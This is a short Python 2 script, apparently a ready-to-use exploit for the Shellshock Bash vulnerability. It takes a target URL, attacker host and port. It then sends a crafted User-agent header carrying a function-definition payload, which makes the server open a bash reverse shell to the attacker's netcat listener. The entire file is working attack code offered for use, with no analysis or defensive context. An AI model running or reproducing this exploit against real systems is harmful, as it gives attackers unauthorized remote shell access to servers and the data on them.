#!/usr/bin/python

import sys, urllib2

if len(sys.argv) != 4:
        print "Usage: shell_shocker <VUL_URL> LHOST LPORT"
        sys.exit(0)

URL=sys.argv[1]
LHOST=sys.argv[2]
LPORT=sys.argv[3]
print "[+] Attempting Shell_Shock - Make sure your nc listening on port "+LPORT
stop=raw_input("Press Enter to Continue......")
opener=urllib2.build_opener()
reverse = "/bin/bash -i >& /dev/tcp/"+LHOST+"/"+LPORT+" 0>&1" 
opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+reverse)]
try:
	response=opener.open(URL)
except Exception as e: print e

